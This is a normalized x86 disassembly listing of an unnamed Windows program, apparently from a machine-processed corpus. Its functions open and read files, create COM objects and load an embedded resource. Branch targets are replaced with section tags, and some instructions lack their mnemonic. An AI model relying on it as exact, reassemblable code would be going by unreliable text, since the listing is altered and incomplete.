mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4413f0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x8 ]
push esi
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ecx + 0x18 ]
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp eax 0x2
jne r-xdata
cmp [ ecx + 0x1c ] 0x0
lea esi [ ecx + 0x1c ]
jne r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ ecx + 0x20 ] 0x0
lea esi [ ecx + 0x20 ]
jne r-xdata
mov eax [ esi ]
pop esi
mov esp ebp
pop ebp
retn 0x4
test esi esi
je r-xdata
mov eax [ esi ]
pop esi
mov esp ebp
pop ebp
retn 0x4
test esi esi
je r-xdata
mov ecx [ ecx + 0x24 ]
push esi
call sub_441860
mov ecx [ ecx + 0x28 ]
push esi
call sub_441860
sub_441460
push ebp
mov ebp esp
push 0xffffffff
push sub_448dcc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x14 ]
push eax
push ecx
push r--data
lea edi [ ebp - 0x14 ]
call sub_401dc0
mov edi [ ebp - 0x14 ]
add esp 0xc
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edi
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x0
push esi
mov [ ebp + 0xb ] 0x0
call [ GetFileSize@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] eax
lea eax [ edi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx esi
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push ebx
call sub_443fa9
add esp 0x4
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
mov edi eax
push edi
push esi
mov [ ebp - 0x10 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov al [ ebp + 0xb ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push edi
call [ `placement delete closure'@IAT ]
add esp 0x4
cmp [ ebp - 0x10 ] ebx
jne r-xdata
push 0x14
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov [ ebp + 0xb ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] edi
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov [ ebp + 0xb ] 0x1
jmp r-xdata
sub_441600
push ebp
mov ebp esp
push 0xffffffff
push sub_447549
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x4 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x8 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0xc ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x5
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4416b0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4416e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4416e0
push ebp
mov ebp esp
push 0xffffffff
push sub_445559
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
or edi 0xffffffff
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
xor cl cl
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] edi
lea eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] edi
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
[ ecx ] edi
dec edi
test edi edi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4417b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
lea esi [ edi + 0x4 ]
test edx edx
jne r-xdata
mov eax edx
lea ebx [ eax + 0x2 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push edx
push esi
mov ebx eax
call sub_402910
mov esi [ ebp + 0x8 ]
lea edx [ edi + 0x8 ]
test esi esi
jne r-xdata
sub eax ebx
sar eax 0x1
mov eax esi
lea ebx [ eax + 0x2 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push esi
push edx
mov ebx eax
call sub_402910
mov edx [ ebp + 0xc ]
add edi 0xc
test edx edx
jne r-xdata
sub eax ebx
sar eax 0x1
mov eax edx
lea esi [ eax + 0x2 ]
lea esp [ esp ]
xor eax eax
push edx
push edi
mov ebx eax
call sub_402910
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push edx
push edi
mov ebx eax
call sub_402910
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_441860
push ebp
mov ebp esp
push 0xffffffff
push sub_448392
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push edi
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x18 ]
push eax
push r--data
push 0x17
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0xfc ]
push 0x0
push eax
call edx
lea esi [ ebp - 0x2c ]
call sub_405ef0
mov [ ebp - 0x4 ] 0x3
mov edi [ eax ]
mov edx [ ebp - 0x18 ]
mov esi [ edx ]
lea ecx [ ebp - 0x14 ]
push ecx
sub esp 0x10
mov ecx esp
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
mov edi [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ecx + 0x8 ] edi
mov [ ecx + 0xc ] eax
mov ecx [ esi + 0xe8 ]
push edx
call ecx
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x2c ]
push edx
call [ VariantClear@IAT ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x18 ] 0x0
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
jmp r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_4419a0
push ebp
mov ebp esp
push 0xffffffff
push sub_444dda
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x14 ]
push eax
push r--data
push 0x17
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0xfc ]
push 0x0
push eax
call edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x104 ]
call eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x0
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_441a90
push ebp
mov ebp esp
push 0xffffffff
push sub_448338
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_441600
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x14 ]
push eax
mov [ esi ] r--data
call sub_441f40
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + 0x60 ]
mov [ ebp - 0x10 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x3
lea eax [ esi + 0x64 ]
mov [ ebp - 0x10 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x5
lea eax [ esi + 0x68 ]
mov [ ebp - 0x10 ] eax
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x7
mov [ esi + 0x6c ] 0x0
mov [ ebp - 0x4 ] 0x8
mov [ esi + 0x70 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_441b40
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_441b70
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_441b70
push ebp
mov ebp esp
push 0xffffffff
push sub_4474e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x5
mov eax [ esi + 0x70 ]
mov edi [ SysFreeString@IAT ]
push eax
call edi
mov [ ebp - 0x4 ] 0x4
mov ecx [ esi + 0x6c ]
push ecx
call edi
mov cl 0x3
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x68 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x64 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov cl 0x1
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x60 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x14 ]
call sub_4420f0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4416e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_441c40
push ebp
mov ebp esp
push 0xffffffff
push sub_4473c0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
mov ecx [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
push ecx
push eax
push esi
call [ FindResourceW@IAT ]
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
push esi
call [ SizeofResource@IAT ]
mov ecx [ ebp + 0x8 ]
push ecx
push esi
mov ebx eax
call [ LoadResource@IAT ]
test eax eax
je r-xdata
push eax
call [ LockResource@IAT ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
cmp [ eax ] 0x2e66622e
jne r-xdata
mov ecx 0x10000
cmp [ eax + 0x3c ] ecx
jne r-xdata
cmp [ eax + 0x40 ] ecx
jne r-xdata
mov [ edi + 0x30 ] ebx
mov ecx ebx
push eax
lea ebx [ edi + 0x14 ]
mov [ edi + 0x2c ] eax
call sub_4425b0
xor ebx ebx
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x4 ]
lea edx [ ebp + 0x8 ]
push edx
push eax
lea edx [ edi + 0x14 ]
call sub_442880
cmp al bl
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
cmp [ ecx - 0xc ] ebx
je r-xdata
cmp al bl
je r-xdata
lea eax [ edi + 0x6c ]
push eax
push ecx
lea edx [ edi + 0x14 ]
call sub_442880
mov ecx [ edi + 0x8 ]
cmp [ ecx - 0xc ] ebx
je r-xdata
cmp al bl
je r-xdata
lea edx [ edi + 0x70 ]
push edx
push ecx
lea edx [ edi + 0x14 ]
call sub_442880
lea eax [ edi + 0x60 ]
cmp eax ebx
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push esi
call sub_4419a0
cmp al bl
je r-xdata
mov [ ebp - 0x4 ] bl
mov edi [ SysFreeString@IAT ]
push ebx
call edi
mov [ ebp - 0x4 ] 0xffffffff
push esi
call edi
mov [ ebp - 0x4 ] bl
mov edi [ SysFreeString@IAT ]
push ebx
call edi
mov [ ebp - 0x4 ] 0xffffffff
push esi
call edi
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_441dc0
push esi
mov esi ecx
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov [ esi + 0x60 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x14 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x14 ]
pop esi
jmp edx
mov [ esi + 0x64 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_441e00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
push esi
cmp eax 0x1
jne r-xdata
mov eax [ ecx + 0x60 ]
pop ebp
retn 0x4
cmp eax 0x2
jne r-xdata
cmp [ ecx + 0x64 ] 0x0
lea esi [ ecx + 0x64 ]
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
cmp [ ecx + 0x68 ] 0x0
lea esi [ ecx + 0x68 ]
jne r-xdata
mov eax [ esi ]
pop esi
pop ebp
retn 0x4
test esi esi
je r-xdata
mov eax [ esi ]
pop esi
pop ebp
retn 0x4
test esi esi
je r-xdata
mov eax [ ecx + 0x6c ]
push esi
push eax
call sub_4419a0
mov ecx [ ecx + 0x70 ]
push esi
push ecx
call sub_4419a0
sub_441e60
push ebp
mov ebp esp
push 0xffffffff
push sub_44685c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp edi ebx
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x10 ]
lea esi [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
push edx
mov [ ebp - 0x10 ] ebx
mov [ ebp + 0xc ] ebx
call sub_442730
cmp al bl
je r-xdata
mov esi [ ebp + 0xc ]
cmp esi 0x2
jbe r-xdata
push 0x14
call [ operator new@IAT ]
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] eax
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x10 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] esi
mov [ eax + 0x10 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] eax
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441f40
push ebp
mov ebp esp
push 0xffffffff
push sub_4482b5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_441600
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea edi [ esi + 0x24 ]
mov [ esi ] r--data
push 0x18
mov [ ebp - 0x14 ] edi
mov [ edi + 0x8 ] ebx
call [ operator new@IAT ]
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x4 ] bl
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
call _CxxThrowException
mov [ edi + 0x4 ] eax
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ edi + 0x4 ]
mov [ edx + 0x15 ] al
mov [ ebp - 0x4 ] 0x4
lea eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] ebx
mov [ ebp - 0x4 ] 0x6
lea eax [ esi + 0x3c ]
mov [ ebp - 0x14 ] eax
mov [ eax ] ebx
mov [ ebp - 0x4 ] 0x8
lea eax [ esi + 0x40 ]
mov [ ebp - 0x14 ] eax
mov [ eax ] ebx
mov [ ebp - 0x4 ] 0xa
mov [ esi + 0x44 ] ebx
mov [ ebp - 0x4 ] 0xb
mov [ esi + 0x48 ] ebx
mov [ ebp - 0x4 ] 0xc
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x34 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_442050
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4420f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_442080
push ebp
mov ebp esp
push 0xffffffff
push sub_446892
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_421cd0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4420f0
push ebp
mov ebp esp
push 0xffffffff
push sub_44745c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x5
mov eax [ edi + 0x48 ]
mov esi [ SysFreeString@IAT ]
push eax
call esi
mov [ ebp - 0x4 ] 0x4
mov ecx [ edi + 0x44 ]
push ecx
call esi
mov cl 0x3
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x40 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x3c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov cl 0x1
mov [ ebp - 0x4 ] cl
lea eax [ edi + 0x38 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x24 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0xb
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x18 ]
mov eax ebx
call sub_421cd0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebx + 0x4 ]
push ebx
call [ operator delete@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov ecx edi
call sub_4416e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_4421f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4473c0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x10 ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
call sub_4424d0
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edi
mov [ ebp + 0x8 ] edi
mov edx [ ecx ]
lea edi [ ebp + 0x8 ]
push edi
lea edi [ ebp - 0x10 ]
push edi
push eax
mov eax [ edx + 0x4 ]
call eax
xor edi edi
test al al
je r-xdata
mov al cl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
lea ecx [ ebp + 0x8 ]
push ecx
push eax
mov edx esi
call sub_442880
mov bl al
test bl bl
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov esi [ SysFreeString@IAT ]
push edi
call esi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
call esi
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
cmp [ eax - 0xc ] edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x2e66622e
jne r-xdata
test bl bl
je r-xdata
lea edx [ esi + 0x44 ]
push edx
push eax
mov edx esi
call sub_442880
mov bl al
mov edx 0x10000
cmp [ eax + 0x3c ] edx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax - 0xc ] edi
je r-xdata
cmp [ eax + 0x40 ] edx
jne r-xdata
test bl bl
je r-xdata
lea ecx [ esi + 0x48 ]
push ecx
push eax
mov edx esi
call sub_442880
mov bl al
push eax
mov ebx esi
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] ecx
call sub_4425b0
mov al 0x1
jmp r-xdata
add esi 0x38
cmp esi edi
jne r-xdata
xor cl cl
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_4419a0
mov bl al
xor bl bl
jmp r-xdata
sub_442340
push esi
mov esi ecx
mov eax [ esi + 0x38 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x3c ]
cmp eax edi
je r-xdata
mov [ esi + 0x38 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov [ esi + 0x3c ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x34 ] edi
pop edi
pop esi
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
